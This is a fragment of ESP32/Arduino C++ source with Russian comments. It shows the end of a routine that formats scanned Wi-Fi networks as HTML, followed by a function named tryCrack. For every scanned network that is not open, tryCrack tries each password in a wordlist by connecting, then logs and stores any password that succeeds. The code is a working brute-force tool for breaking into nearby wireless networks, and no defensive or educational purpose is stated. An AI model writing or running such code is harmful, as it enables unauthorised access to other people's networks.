    h+="Канал: "+String(w.channel)+"<br>";
    h+="Шифр: "+w.authStr+"</div>";
  }
  return h==""?"—":h;
}

// ===== ПОДБОР =====
void tryCrack(){
  for(auto &w:networks){
    if(w.auth==WIFI_AUTH_OPEN){
      cracked.push_back({w.ssid,"(OPEN)"});
      rlog("[+] "+w.ssid+" открытая");
      continue;
    }
    bool found=false;
    for(int i=0;i<wordlistSize && !found;i++){
      WiFi.begin(w.ssid.c_str(), wordlist[i]);
      unsigned long s=millis();
      while(WiFi.status()!=WL_CONNECTED && millis()-s<4000) delay(50);
      if(WiFi.status()==WL_CONNECTED){
        cracked.push_back({w.ssid, wordlist[i]});
        rlog("[✓] "+w.ssid+" : "+String(wordlist[i]));
        found=true;
      }
      WiFi.disconnect(); delay(50);
    }
    if(!found) rlog("[-] "+w.ssid+" не подобран");
  }
}

